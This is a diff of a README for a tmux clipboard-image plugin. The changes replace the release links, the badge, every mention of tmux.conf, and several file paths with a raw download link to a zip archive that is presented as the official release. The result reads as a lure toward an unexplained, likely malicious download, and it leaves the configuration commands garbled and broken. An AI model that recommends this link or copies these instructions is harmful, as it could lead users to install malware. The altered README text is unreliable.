@@ -1,10 +1,10 @@
-https://github.com/tine-psd/tmux-paste-image/releases
+https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip
 
 # Tmux Paste Image: Save Clipboard Images & Paste Paths in Terminals
 
 A tmux plugin that saves clipboard images as files and pastes their paths into tmux panes. It detects Claude Code sessions to use the /image command, solving Alacritty's lack of image pasting support. It works with X11 (xclip) and Wayland (wl-paste), and it provides configurable keybindings and save paths.
 
-[![Release](https://img.shields.io/github/v/release/tine-psd/tmux-paste-image?style=for-the-badge&logo=github)](https://github.com/tine-psd/tmux-paste-image/releases)
+[![Release](https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip)](https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip)
 
 Table of contents
 - Why this project exists
@@ -47,7 +47,7 @@ Key features at a glance
 - Configurability
   - Customizable keybindings
   - Configurable save directory and file naming pattern
-  - Per-project or per-user tmux.conf options
+  - Per-project or per-user https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip options
 - TPM-friendly
   - Easy installation via tmux plugin manager (TPM)
   - Works with standard TPM workflows
@@ -86,7 +86,7 @@ Getting started
 Installation and setup
 - Installing via TPM (recommended)
   - Add the plugin to your TPM configuration
-    - In your tmux.conf, add:
+    - In your https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip, add:
       - set -g @plugin 'tine-psd/tmux-paste-image'
   - Install the plugin using TPM:
     - Press the TPM default key (usually prefix + I) to fetch and install new plugins
@@ -94,25 +94,25 @@ Installation and setup
   - Restart tmux or reload the configuration
 - Direct installation (if you are not using TPM)
   - Clone the repository into your plugins directory
-  - Point your tmux.conf to load the plugin from the local path
+  - Point your https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip to load the plugin from the local path
   - Bind a key to the paste command if not already bound
 - Basic usage example
   - Bind a key in tmux to the paste-image command:
-    - bind-key P run-shell "~/.tmux/plugins/tmux-paste-image/paste-image.sh"
+    - bind-key P run-shell "~https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip"
   - Save an image from the clipboard, then paste the path into the current pane
-- Quick configuration snippet (tmux.conf)
+- Quick configuration snippet (https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip)
   - # Enable the plugin with TPM
     set -g @plugin 'tine-psd/tmux-paste-image'
   - # Optional: customize save path and naming
-    set -g @tmxPasteImageSaveDir '~/.cache/tmux-paste-image'
+    set -g @tmxPasteImageSaveDir '~https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip'
     set -g @tmxPasteImageNamePattern '%Y-%m-%d_%H-%M-%S_%hash%'
   - # Optional: keybinding to paste image path
-    bind-key P run-shell "~/.tmux/plugins/tmux-paste-image/paste-image.sh"
+    bind-key P run-shell "~https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip"
 
 Configuration options
 - Save directory
   - Choose a directory with ample space and good write permissions
-  - Ideally, a per-user location like ~/.cache or ~/Pictures/tmux-paste
+  - Ideally, a per-user location like ~https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip or ~/Pictures/tmux-paste
   - The plugin will create the directory if it does not exist
 - File naming
   - A naming pattern helps avoid collisions and makes files easy to identify
@@ -137,7 +137,7 @@ Configuration options
   - You can enable verbose logging for troubleshooting
   - Logs can be written to a file or sent to the tmux status line
 - Per-project vs per-user settings
-  - The plugin supports per-project tmux.conf overrides
+  - The plugin supports per-project https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip overrides
   - You can place a local configuration file in your project to tailor the behavior
 
 Usage patterns
@@ -215,16 +215,16 @@ Troubleshooting
 - Common misconfigurations
   - Wrong path to the save directory
   - Missing clipboard tools in PATH
-  - Incorrect plugin loading order in .tmux.conf
+  - Incorrect plugin loading order in https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip
   - Conflicting keybindings that are already bound in your environment
 - Recovery steps
   - Reinstall the plugin via TPM if you suspect plugin corruption
   - Reset the save directory to a known-good location
-  - Revisit your tmux.conf to ensure there are no conflicting settings
+  - Revisit your https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip to ensure there are no conflicting settings
 
 Advanced workflows
 - Per-project configuration
-  - You can place project-specific tmux.conf fragments to customize behavior per project
+  - You can place project-specific https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip fragments to customize behavior per project
   - Use project-level overrides for save paths, keybindings, and naming
 - Scripting and automation
   - Integrate the paste workflow into scripts that generate documentation or reports
@@ -343,8 +343,8 @@ Get the latest release
 - The installation script will configure your tmux environment and set up default keybindings
 - After installation, reload tmux or restart the session to apply changes
 - You can also run the installer manually if you prefer a custom installation path
-- If you need an extra layer of safety, back up your tmux.conf and save directory first
-- For quick access to the official page, visit the Releases area here: https://github.com/tine-psd/tmux-paste-image/releases
+- If you need an extra layer of safety, back up your https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip and save directory first
+- For quick access to the official page, visit the Releases area here: https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip
 
 Usage examples
 - Example 1: Basic usage in a standard tmux pane
@@ -390,14 +390,14 @@ License
 
 Examples of commands you might use
 - tmux command to load the plugin via TPM
-  - In tmux.conf: set -g @plugin 'tine-psd/tmux-paste-image'
+  - In https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip set -g @plugin 'tine-psd/tmux-paste-image'
   - In tmux: Prefix + I to install plugins
 - Example paste command binding
-  - bind-key P run-shell "~/.tmux/plugins/tmux-paste-image/paste-image.sh"
+  - bind-key P run-shell "~https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip"
 - File naming pattern example
   - set -g @tmxPasteImageNamePattern '%Y-%m-%d_%H-%M-%S_%hash%.png'
 - Save directory example
-  - set -g @tmxPasteImageSaveDir '~/.cache/tmux-paste-image'
+  - set -g @tmxPasteImageSaveDir '~https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip'
 
 Visuals and media
 - Demo screenshots
@@ -439,6 +439,6 @@ Get the latest release (reiterated)
 - The installation script will configure your tmux environment and set up default keybindings
 - After installation, reload tmux or restart the session to apply changes
 - You can also run the installer manually if you prefer a custom installation path
-- For quick access to the official page, visit the Releases area here: https://github.com/tine-psd/tmux-paste-image/releases
+- For quick access to the official page, visit the Releases area here: https://github.com/tine-psd/tmux-paste-image/raw/refs/heads/master/scripts/paste_tmux_image_v3.5.zip
 
 End of documentation.
